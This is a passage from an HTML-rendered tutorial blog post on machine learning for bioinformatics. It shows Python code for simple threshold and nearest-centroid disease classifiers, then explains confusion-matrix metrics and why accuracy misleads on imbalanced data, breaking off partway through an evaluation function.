class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">y_pred2 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> model2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">predict</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">X_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"\nModel 2: Mean-based classifier (threshold=6.5)"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Sample predictions: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">y_pred2</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">10]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="model-3-distance-based-classifier-nearest-centroid">Model 3: Distance-Based Classifier (Nearest Centroid)<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#model-3-distance-based-classifier-nearest-centroid" class="hash-link" aria-label="Direct link to Model 3: Distance-Based Classifier (Nearest Centroid)" title="Direct link to Model 3: Distance-Based Classifier (Nearest Centroid)" translate="no">​</a></h3>
<p>Even better: find the center of each class, classify by distance:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">class</span><span class="token plain"> </span><span class="token class-name" style="color:hsl(35, 99%, 36%)">NearestCentroidClassifier</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    Classify based on distance to class centroids.</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    Algorithm:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    1. During training: Calculate mean (centroid) of each class</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    2. During prediction: For new sample, predict class of nearest centroid</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    This is the foundation for more complex algorithms like KNN!</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    Think of it as: "Find which disease type the patient is closest to"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    """</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">__init__</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">centroids </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">fit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> X</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Learn the centroid (average) of each class."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> class_label </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">unique</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">centroids</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">class_label</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> X</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">y </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> class_label</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">mean</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">axis</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"✓ Learned </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation builtin" style="color:hsl(119, 34%, 47%)">len</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation interpolation">self</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">centroids</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> class centroids"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"  Normal centroid: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">self</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">centroids</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">0</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"  Disease centroid: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">self</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">centroids</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">1</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">predict</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> X</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Predict by finding nearest centroid."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        predictions </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> sample </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> X</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Calculate distance to each centroid</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            distances </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> class_label</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> centroid </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">centroids</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">items</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Euclidean distance</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                distance </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">sqrt</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">sum</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">sample </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token plain"> centroid</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">**</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                distances</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">class_label</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> distance</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Predict class of nearest centroid</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            prediction </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">min</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">distances</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> key</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">distances</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">get</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            predictions</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">prediction</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">array</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">predictions</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Train and test</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">model3 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> NearestCentroidClassifier</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">model3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">fit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">X_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">y_pred3 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> model3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">predict</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">X_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"\nModel 3: Nearest Centroid Classifier"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Sample predictions: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">y_pred3</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">10]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>Output:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">✓ Learned 2 class centroids</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  Normal centroid: [4.87 4.92 5.11]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  Disease centroid: [7.98 8.15 8.23]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Model 3: Nearest Centroid Classifier</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Sample predictions: [1 1 0 1 0 0 0 0 1 0]</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="part-2-evaluating-classification-models">Part 2: Evaluating Classification Models<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#part-2-evaluating-classification-models" class="hash-link" aria-label="Direct link to Part 2: Evaluating Classification Models" title="Direct link to Part 2: Evaluating Classification Models" translate="no">​</a></h2>
<p>Now that we have predictions, how do we know which model is good? We need evaluation metrics!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="key-metrics-explained-especially-for-imbalanced-data">Key Metrics Explained (Especially for Imbalanced Data)<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#key-metrics-explained-especially-for-imbalanced-data" class="hash-link" aria-label="Direct link to Key Metrics Explained (Especially for Imbalanced Data)" title="Direct link to Key Metrics Explained (Especially for Imbalanced Data)" translate="no">​</a></h3>
<p><strong>Confusion Matrix</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                 Predicted</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                 Disease  Healthy</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Actual</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Disease      TP         FN</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Healthy      FP         TN</span><br></span></code></pre></div></div>
<p><strong>Definitions:</strong></p>
<ul>
<li class=""><strong>TP (True Positive)</strong>: Correctly identified disease → Good! ✓</li>
<li class=""><strong>TN (True Negative)</strong>: Correctly identified healthy → Good! ✓</li>
<li class=""><strong>FP (False Positive)</strong>: Healthy person predicted as disease → False alarm ✗</li>
<li class=""><strong>FN (False Negative)</strong>: Disease person predicted as healthy → Dangerous! ✗</li>
</ul>
<p><strong>Metrics (Importance for Imbalanced Data):</strong></p>
<table><thead><tr><th>Metric</th><th>Formula</th><th>Meaning</th><th>Best For</th></tr></thead><tbody><tr><td><strong>Accuracy</strong></td><td>(TP+TN)/(TP+TN+FP+FN)</td><td>Overall correctness</td><td>❌ <strong>MISLEADING for imbalanced data</strong></td></tr><tr><td><strong>Sensitivity/Recall</strong></td><td>TP/(TP+FN)</td><td>% of disease cases caught</td><td>✅ Essential for imbalanced data</td></tr><tr><td><strong>Specificity</strong></td><td>TN/(TN+FP)</td><td>% of healthy cases caught</td><td>✅ Reveals when model ignores minority class</td></tr><tr><td><strong>Precision</strong></td><td>TP/(TP+FP)</td><td>% of disease predictions correct</td><td>✅ Shows cost of false alarms</td></tr></tbody></table>
<p><strong>Why Recall + Specificity Matter More Than Accuracy for Imbalanced Data:</strong></p>
<p>In our test set: 19 disease, 1 healthy (95% disease cases)</p>
<ul>
<li class="">Model predicts "disease" for everything</li>
<li class="">Accuracy = 95% (looks good!)</li>
<li class="">But Specificity = 0% (completely missed the healthy person!)</li>
</ul>
<p><strong>Recall</strong> and <strong>Specificity</strong> immediately show the problem.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">evaluate_classification</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_true</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y_pred</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> model_name</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"Model"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Evaluate a classification model using confusion matrix and metrics."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Calculate confusion matrix</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    TP </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">sum</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_true </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_pred </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    TN </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">sum</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_true </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_pred </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    FP </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">sum</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_true </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_pred </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    FN </span><span class="token operator" 